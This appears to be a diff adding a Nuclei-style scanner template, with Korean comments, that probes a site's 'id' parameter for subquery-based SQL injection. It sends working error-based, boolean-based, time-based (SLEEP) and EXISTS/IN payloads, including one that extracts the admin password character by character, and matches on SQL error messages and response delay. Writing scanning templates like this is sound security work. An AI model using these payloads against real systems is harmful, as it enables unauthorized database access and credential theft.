@@ -1,0 +1,45 @@
+id: sqli-subquery-based
+
+info:
+  name: SQL Injection via Subquery Techniques
+  author: security-researcher
+  severity: high
+  description: |
+    서브쿼리를 이용한 SQL 인젝션 공격 패턴을 탐지합니다.
+    중첩 SELECT, FROM 절 서브쿼리 등을 이용합니다.
+  tags: sqli,subquery,injection
+
+http:
+  - method: GET
+    path:
+      # 서브쿼리 에러 기반
+      - "{{BaseURL}}?id=1 AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x7e,(SELECT version()),0x7e,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+      # 서브쿼리 불리언 기반
+      - "{{BaseURL}}?id=1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'"
+      - "{{BaseURL}}?id=1 AND (SELECT COUNT(*) FROM users)>0"
+      # 서브쿼리 시간 기반
+      - "{{BaseURL}}?id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+      - "{{BaseURL}}?id=1 AND (SELECT IF(1=1,SLEEP(5),0))--"
+      # 상관 서브쿼리
+      - "{{BaseURL}}?id=1 AND EXISTS(SELECT * FROM users WHERE username='admin')"
+      - "{{BaseURL}}?id=1 AND EXISTS(SELECT 1)"
+      # IN 절 서브쿼리
+      - "{{BaseURL}}?id=1 AND 1 IN (SELECT 1)"
+      - "{{BaseURL}}?id=1 AND id IN (SELECT id FROM users LIMIT 1)"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "you have an error in your sql syntax"
+          - "XPATH syntax error"
+          - "Duplicate entry.*for key"
+          - "ORA-\\d{5}"
+          - "sql.*error"
+        condition: or
+        case-insensitive: true
+
+      - type: dsl
+        dsl:
+          - "duration >= 5000"
